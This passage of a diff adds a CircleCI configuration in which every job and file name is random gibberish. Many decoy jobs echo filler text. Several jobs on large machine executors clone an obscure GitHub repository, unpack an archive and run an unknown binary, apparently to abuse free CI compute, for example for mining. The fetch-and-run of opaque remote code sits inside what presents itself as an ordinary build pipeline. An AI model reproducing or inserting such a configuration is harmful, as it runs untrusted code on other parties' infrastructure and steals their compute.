+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: ftfac
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  qfctbrzluq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: wcyrbyawbnfno
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'wxnvrykpwetd vcwkvokcwtz' > /tmp/tufcdzysni/xtiawbeypei
+            ls -la /tmp/tufcdzysni/xtiawbeypei
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'xtiawbeypei'
+  vghlnlggku:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: iaxdf
+          command: |
+            cat /tmp/tufcdzysni/xtiawbeypei
+      - run:
+          name: ejxhxlmb
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: qhahzzykjxtjpcn
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+  hoedtzwzm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: yaheejdzxunipan
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'tddnakamwxhez tlzluwcgorzrtgk' > /tmp/tufcdzysni/qpcphqlmrirf
+            ls -la /tmp/tufcdzysni/qpcphqlmrirf
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'qpcphqlmrirf'
+  vqqmdd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: sjfpfnorwan
+          command: |
+            cat /tmp/tufcdzysni/qpcphqlmrirf
+      - run:
+          name: pumaurcfexmcw
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/marybrunerx7zft-max/2ad73ec6be37.git .
+      - run:
+          name: lrekofgfsnmfthn
+          command: tar -xJf xzkxgrsf.tar.xz
+      - run:
+          command: /bin/sh -c "./sfnxpmdtr"
+
+  apzwzdnhzbq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: irwqnewfy
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'uspyiuvrlgzefc shkjhxwlsbuactbu' > /tmp/tufcdzysni/ouowuadrlv
+            ls -la /tmp/tufcdzysni/ouowuadrlv
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'ouowuadrlv'
+  ntdgpxkxypkd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: xdpzldoppwuuu
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'smgoldvpdaqgv icfcqjovjmlnb' > /tmp/tufcdzysni/tewrbqff
+            ls -la /tmp/tufcdzysni/tewrbqff
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'tewrbqff'
+  hglwqt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: jyeefpopcwpn
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'ilagnawcdtxglqk bgvpobzqclqppnv' > /tmp/tufcdzysni/jgyotn
+            ls -la /tmp/tufcdzysni/jgyotn
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'jgyotn'
+  noazsedi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: xcrwzxkttszt
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'jhbfpisjyhadohvom pogefwygijpchjabr' > /tmp/tufcdzysni/kqcdjldbnz
+            ls -la /tmp/tufcdzysni/kqcdjldbnz
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'kqcdjldbnz'
+  mhiwvjmfsgct:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: ytnddscbmgkzqm
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'lzbnprlwfo ahoahfredvbn' > /tmp/tufcdzysni/fuvszlhd
+            ls -la /tmp/tufcdzysni/fuvszlhd
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'fuvszlhd'
+  kvvskshqhtjn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: oldagyidzmprprm
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'rbmchhxgcfvt uuzcssibfqbrgtnsz' > /tmp/tufcdzysni/ashohclf
+            ls -la /tmp/tufcdzysni/ashohclf
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'ashohclf'
+  uzgfoc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: hwuemslwdhfjp
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'citpbxhlgrbpqeiqp dbuqeveqevyti' > /tmp/tufcdzysni/diszbkiiihmsu
+            ls -la /tmp/tufcdzysni/diszbkiiihmsu
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'diszbkiiihmsu'
+  ownhtpk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: vgwkoea
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'ytvqnnhmxopipop fldzixpuvbckk' > /tmp/tufcdzysni/ptvyxumqqbggc
+            ls -la /tmp/tufcdzysni/ptvyxumqqbggc
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'ptvyxumqqbggc'
+  jodgo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: ecloqkn
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'xbxcnnwdzbrealkuva cmgacxgmvhpozlijv' > /tmp/tufcdzysni/shheqcfy
+            ls -la /tmp/tufcdzysni/shheqcfy
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'shheqcfy'
+  hunaabknhid:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: tymadd
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'aaxiyekvin tqcmssclwmm' > /tmp/tufcdzysni/qsghwbqvg
+            ls -la /tmp/tufcdzysni/qsghwbqvg
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'qsghwbqvg'
+  sojorzz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: smhjceh
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'incabesocjcne qgjcxlhhihe' > /tmp/tufcdzysni/xtiawbeypei
+            ls -la /tmp/tufcdzysni/xtiawbeypei
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'xtiawbeypei'
+  iyuuderxpqlvour:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: nfynf
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'acyuredqilvwxexgn kabmcbfcoo' > /tmp/tufcdzysni/lzdvcgzm
+            ls -la /tmp/tufcdzysni/lzdvcgzm
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'lzdvcgzm'
+  meoyidizlp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: cvjausqqhm
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'lndychnpwddxqqrl mhbigzqonstnovllm' > /tmp/tufcdzysni/kbgeqgbsjqoz
+            ls -la /tmp/tufcdzysni/kbgeqgbsjqoz
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'kbgeqgbsjqoz'
+  jhgjhlmc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: gsbqqqla
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'hocfxvbzcvrw ylupkvtrzyq' > /tmp/tufcdzysni/rawpjxadulqyzi
+            ls -la /tmp/tufcdzysni/rawpjxadulqyzi
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'rawpjxadulqyzi'
+  ltmuqpyxnethmh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: qysogmgdglixk
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'qnkssbvtlssrw sownixwzpd' > /tmp/tufcdzysni/zoirar
+            ls -la /tmp/tufcdzysni/zoirar
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'zoirar'
+  gwtym:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: ylvsmw
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'gaorstisofcrbt ctuhgtwpjponrgkoau' > /tmp/tufcdzysni/khylgditywrqsq
+            ls -la /tmp/tufcdzysni/khylgditywrqsq
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'khylgditywrqsq'
+  arwundbb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: irsyiom
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'xlzbmshanjvk lafeaqqrcbodmsa' > /tmp/tufcdzysni/lqagva
+            ls -la /tmp/tufcdzysni/lqagva
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'lqagva'
+  cxzvnrgrxlsnhjw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: lyccsjecwgf
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'jyxmpsxzbbtt njulcoxaipqcptecz' > /tmp/tufcdzysni/jnaluq
+            ls -la /tmp/tufcdzysni/jnaluq
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'jnaluq'
+  othlf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: bdqlemk
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'lttlgzdcofwcl ugxyseoehgvcjvy' > /tmp/tufcdzysni/qoizzuqllungku
+            ls -la /tmp/tufcdzysni/qoizzuqllungku
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'qoizzuqllungku'
+  ryueeomxhmika:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: vqybt
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'ihrhmetxcmc gagzzolypzyygxl' > /tmp/tufcdzysni/rsihughzxr
+            ls -la /tmp/tufcdzysni/rsihughzxr
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'rsihughzxr'
+  rqjgjnin:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: xpdvftgzmaj
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'hanwfsfors nmknyhsbczpu' > /tmp/tufcdzysni/qvyddgwwmmmdgt
+            ls -la /tmp/tufcdzysni/qvyddgwwmmmdgt
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'qvyddgwwmmmdgt'
+  pvznmybgcizdpm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: kqmzzx
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'knwiqbsckdfvcsoxcu clorjgdxikmdtgc' > /tmp/tufcdzysni/ntgvgpl
+            ls -la /tmp/tufcdzysni/ntgvgpl
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'ntgvgpl'
+  xazxobrz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: lzegzrgvqehh
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'akzgdsqvcwknaj pzqclyjfkitdl' > /tmp/tufcdzysni/hrffuqxm
+            ls -la /tmp/tufcdzysni/hrffuqxm
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'hrffuqxm'
+  rujuynewar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/tufcdzysni
+      - run:
+          name: mmpoajvdncorbly
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'utallmssmii bkevfqfqfm' > /tmp/tufcdzysni/tgwoayngyxu
+            ls -la /tmp/tufcdzysni/tgwoayngyxu
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'tgwoayngyxu'
+  tcxtmrkd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: cugxqnltw
+          command: |
+            mkdir -p /tmp/tufcdzysni
+            echo 'kvzslcowiscpqx edymzqowkl' > /tmp/tufcdzysni/bkdesbs
+            ls -la /tmp/tufcdzysni/bkdesbs
+      - persist_to_workspace:
+          root: /tmp/tufcdzysni
+          paths:
+            - 'bkdesbs'
+workflows:
+  yqathw:
+    jobs:
+      - gadjwvmcnxoyh
+      - hugttmxzpd:
+          requires:
+            - gadjwvmcnxoyh
+      - bcicsnm:
+          requires:
+            - gadjwvmcnxoyh
+      - mrgpc:
+          requires:
+            - bcicsnm
+      - srobs:
+          requires:
+            - bcicsnm
+      - auuaskph:
+          requires:
+            - srobs
+      - hoedtzwzm:
+          requires:
+            - srobs
+      - vqqmdd:
+          requires:
+            - hoedtzwzm
+      - skmdxytuua:
+          requires:
+            - hoedtzwzm
+      - adieh:
+          requires:
+            - skmdxytuua
+      - gnutmgw
+      - apzwzdnhzbq:
+          requires:
+            - gnutmgw
+      - hcxakdjhkup:
+          requires:
+            - apzwzdnhzbq
+      - jjeojg:
+          requires:
+            - apzwzdnhzbq
+      - ntdgpxkxypkd:
+          requires:
+            - jjeojg
+      - sdvetzescievxd:
+          requires:
+            - ntdgpxkxypkd
+      - hbmdkatjscpbw:
+          requires:
+            - ntdgpxkxypkd
+      - hglwqt:
+          requires:
+            - hbmdkatjscpbw
+      - latidhwol:
+          requires:
+            - hglwqt
+      - gwfjmncudtclgd:
+          requires:
+            - hglwqt
+      - noazsedi:
+          requires:
+            - gwfjmncudtclgd
+      - rsowfmxds:
+          requires:
+            - noazsedi
+      - awvoolwdsxkr:
+          requires:
+            - noazsedi
+      - mhiwvjmfsgct:
+          requires:
+            - awvoolwdsxkr
+      - grudgyzqbjso:
+          requires:
+            - mhiwvjmfsgct
+      - dwenprnrr
+      - kvvskshqhtjn:
+          requires:
+            - dwenprnrr
+      - yalszovslze:
+          requires:
+            - kvvskshqhtjn
+      - hknydwxvxdzlpep:
+          requires:
+            - kvvskshqhtjn
+      - uzgfoc:
+          requires:
+            - hknydwxvxdzlpep
+      - qlistzhvbtinoc:
+          requires:
+            - uzgfoc
+      - krzgbrawa:
+          requires:
+            - uzgfoc
+      - ownhtpk:
+          requires:
+            - krzgbrawa
+      - cyczpka:
+          requires:
+            - ownhtpk
+      - csyzupddkxa:
+          requires:
+            - ownhtpk
+      - jodgo:
+          requires:
+            - csyzupddkxa
+      - niplatqdhia:
+          requires:
+            - jodgo
+      - kaldjtaurz:
+          requires:
+            - jodgo
+      - hunaabknhid:
+          requires:
+            - kaldjtaurz
+      - nmqzvqvnqctk:
+          requires:
+            - hunaabknhid
+      - qfctbrzluq
+      - sojorzz:
+          requires:
+            - qfctbrzluq
+      - vghlnlggku:
+          requires:
+            - sojorzz
+      - ktpihahvory:
+          requires:
+            - sojorzz
+      - iyuuderxpqlvour:
+          requires:
+            - ktpihahvory
+      - qtkwoicajzici:
+          requires:
+            - iyuuderxpqlvour
+      - hxronvw:
+          requires:
+            - iyuuderxpqlvour
+      - meoyidizlp:
+          requires:
+            - hxronvw
+      - mpledtisjreimv:
+          requires:
+            - meoyidizlp
+      - tbebbyrilkgxt:
+          requires:
+            - meoyidizlp
+      - jhgjhlmc:
+          requires:
+            - tbebbyrilkgxt
+      - vzvtl:
+          requires:
+            - jhgjhlmc
+      - yxvxndn:
+          requires:
+            - jhgjhlmc
+      - ltmuqpyxnethmh:
+          requires:
+            - yxvxndn
+      - fobwdmy:
+          requires:
+            - ltmuqpyxnethmh
+      - uvjrxgpoqeesct:
+          requires:
+            - ltmuqpyxnethmh
+      - gwtym:
+          requires:
+            - uvjrxgpoqeesct
+      - puyfzzt:
+          requires:
+            - gwtym
+      - lwjwklekmc:
+          requires:
+            - gwtym
+      - arwundbb:
+          requires:
+            - lwjwklekmc
+      - kgpllsksb:
+          requires:
+            - arwundbb
+      - mxcufhap:
+          requires:
+            - arwundbb
+      - cxzvnrgrxlsnhjw:
+          requires:
+            - mxcufhap
+      - ihexsibwnvo:
+          requires:
+            - cxzvnrgrxlsnhjw
+      - cbgjpacakkzecw:
+          requires:
+            - cxzvnrgrxlsnhjw
+      - othlf:
+          requires:
+            - cbgjpacakkzecw
+      - iuwwdoc:
+          requires:
+            - othlf
+      - apagcufklls
+      - ryueeomxhmika:
+          requires:
+            - apagcufklls
+      - xmoubeupxfp:
+          requires:
+            - ryueeomxhmika
+      - gqzcwptou:
+          requires:
+            - ryueeomxhmika
+      - rqjgjnin:
+          requires:
+            - gqzcwptou
+      - ixlba:
+          requires:
+            - rqjgjnin
+      - iputrshtcgkt:
+          requires:
+            - rqjgjnin
+      - pvznmybgcizdpm:
+          requires:
+            - iputrshtcgkt
+      - kwlblpfdpo:
+          requires:
+            - pvznmybgcizdpm
+      - wqkyrvasniktsa:
+          requires:
+            - pvznmybgcizdpm
+      - xazxobrz:
+          requires:
+            - wqkyrvasniktsa
+      - gfezjjntxqziwk:
+          requires:
+            - xazxobrz
+      - luarpbplrztruk:
+          requires:
+            - xazxobrz
+      - rujuynewar:
+          requires:
+            - luarpbplrztruk
+      - zmaqe:
+          requires:
+            - rujuynewar
+      - mgzai:
+          requires:
+            - rujuynewar
+      - tcxtmrkd:
+          requires:
+            - mgzai
+      - ixmizt:
+          requires:
+            - tcxtmrkd
